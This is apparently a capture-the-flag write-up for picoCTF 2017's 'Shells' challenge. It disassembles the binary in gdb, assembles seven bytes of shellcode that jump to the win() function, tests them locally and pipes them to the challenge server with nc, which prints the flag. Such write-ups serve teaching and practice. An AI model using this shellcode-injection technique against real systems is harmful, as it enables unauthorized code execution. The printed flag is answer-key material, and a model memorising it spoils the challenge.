**Challenge name:** Shells  
**Description:** How much can a couple bytes do? Use shells! Source. Connect on shell2017.picoctf.com:58279.  
**Hint:** Read about basic shellcode  
You don't need a full shell (yet...), just enough to get the flag  
**File(s) provided:**  
- shells (ELF 32-bit binary)
- shells.c (source code)

---
# Step 0: Recon
Similar to shellz. In this case, we only get to execute 10 bytes worth of shellcode. Luckily, there is now a function (```void win()```) that does what we need. All we need to do is feed it some shellcode that jumps to that function.

# Step 1: Create shellcode
First, let's figure out the address of where we need to jump to. It's likely that ASLR is disabled anyway.
```bash
# gdb shells -q
Reading symbols from shells...(no debugging symbols found)...done.
(gdb) disas win
Dump of assembler code for function win:
   0x08048540 <+0>:	push   %ebp
...
```
Our shellcode should look like this:
``` asm
mov eax, 0x08048540
call eax
```
Note: my first try was to run ``` call 0x08048540```, but the nasm_shell output (see next step) didn't work in gdb.

# Step 2: Assemble the shellcode
To get the instruction bytes for shellcode, we are going to use metasploit's nasm_shell:
``` bash
# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
nasm > mov eax, 0x08048540
00000000  B840850408        mov eax,0x8048540
nasm > call eax
00000000  FFD0              call eax
```
To pass this shellcode to the binary, we can use python:
``` bash
# python -c 'print "\xB8\x40\x85\x04\x08\xFF\xD0"'
```
# Step 3: Test locally
First, we create a test flag file.
Next, we set a breakpoint at the right point (```call *%eax```):
``` bash
# gdb shells -q
Reading symbols from shells...(no debugging symbols found)...done.
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x08048560 <+0>:	push   %ebp
   0x08048561 <+1>:	mov    %esp,%ebp
   0x08048563 <+3>:	sub    $0x18,%esp
   0x08048566 <+6>:	sub    $0x8,%esp
   0x08048569 <+9>:	push   $0x0
   0x0804856b <+11>:	push   $0x0
   0x0804856d <+13>:	push   $0x22
   0x0804856f <+15>:	push   $0x7
   0x08048571 <+17>:	push   $0xa
   0x08048573 <+19>:	push   $0x0
   0x08048575 <+21>:	call   0x8048420 <mmap@plt>
   0x0804857a <+26>:	add    $0x20,%esp
   0x0804857d <+29>:	mov    %eax,-0xc(%ebp)
   0x08048580 <+32>:	cmpl   $0xffffffff,-0xc(%ebp)
   0x08048584 <+36>:	jne    0x80485a0 <vuln+64>
   0x08048586 <+38>:	sub    $0xc,%esp
   0x08048589 <+41>:	push   $0x8048714
   0x0804858e <+46>:	call   0x80483e0 <puts@plt>
   0x08048593 <+51>:	add    $0x10,%esp
   0x08048596 <+54>:	sub    $0xc,%esp
   0x08048599 <+57>:	push   $0x0
   0x0804859b <+59>:	call   0x8048410 <exit@plt>
   0x080485a0 <+64>:	sub    $0x8,%esp
   0x080485a3 <+67>:	push   $0xa
   0x080485a5 <+69>:	push   $0x804873e
   0x080485aa <+74>:	call   0x80483c0 <printf@plt>
   0x080485af <+79>:	add    $0x10,%esp
   0x080485b2 <+82>:	mov    0x8049a60,%eax
   0x080485b7 <+87>:	sub    $0xc,%esp
   0x080485ba <+90>:	push   %eax
   0x080485bb <+91>:	call   0x80483d0 <fflush@plt>
   0x080485c0 <+96>:	add    $0x10,%esp
   0x080485c3 <+99>:	sub    $0x4,%esp
   0x080485c6 <+102>:	push   $0xa
   0x080485c8 <+104>:	pushl  -0xc(%ebp)
   0x080485cb <+107>:	push   $0x0
   0x080485cd <+109>:	call   0x80483b0 <read@plt>
   0x080485d2 <+114>:	add    $0x10,%esp
   0x080485d5 <+117>:	mov    %eax,-0x10(%ebp)
   0x080485d8 <+120>:	cmpl   $0x0,-0x10(%ebp)
   0x080485dc <+124>:	jne    0x80485f8 <vuln+152>
   0x080485de <+126>:	sub    $0xc,%esp
---Type <return> to continue, or q <return> to quit---
   0x080485e1 <+129>:	push   $0x8048754
   0x080485e6 <+134>:	call   0x80483c0 <printf@plt>
   0x080485eb <+139>:	add    $0x10,%esp
   0x080485ee <+142>:	sub    $0xc,%esp
   0x080485f1 <+145>:	push   $0x0
   0x080485f3 <+147>:	call   0x8048410 <exit@plt>
   0x080485f8 <+152>:	mov    -0xc(%ebp),%eax
   0x080485fb <+155>:	mov    %eax,-0x14(%ebp)
   0x080485fe <+158>:	mov    -0x14(%ebp),%eax
   0x08048601 <+161>:	call   *%eax
   0x08048603 <+163>:	leave  
   0x08048604 <+164>:	ret    
End of assembler dump.
(gdb) break *0x08048601
Breakpoint 1 at 0x8048601
```
Let's run the binary in gdb with the right input. Note how you can still call python from within gdb.
``` bash
(gdb) run < <(python -c 'print "\xB8\x40\x85\x04\x08\xFF\xD0"')
Starting program: /mnt/hgfs/Shared/ctf/pico2017/shells/shells < <(python -c 'print "\xB8\x40\x85\x04\x08\xFF\xD0"')
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 10 bytes:

Breakpoint 1, 0x08048601 in vuln ()
```
We are at the point just before the shellode is executed. Let's inspect memory and the instructions to be executed.
``` bash
(gdb) si
0xf7ffb000 in ?? ()
(gdb) x/2x $eip
0xf7ffb000:	0x048540b8	0x0ad0ff08
(gdb) x/2i $eip
=> 0xf7ffb000:	mov    $0x8048540,%eax
   0xf7ffb005:	call   *%eax
```
Looks good. Continuing shows that the test flag file is indeed read.
``` bash
(gdb) c
Continuing.
test

Program received signal SIGSEGV, Segmentation fault.
0xf7ffb007 in ?? ()
```
# Step 5: Get flag
``` bash
# python -c 'print "\xB8\x40\x85\x04\x08\xFF\xD0"' | nc shell2017.picoctf.com 58279
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 10 bytes:
84f1e856de605076057b0687dfd0865f
```
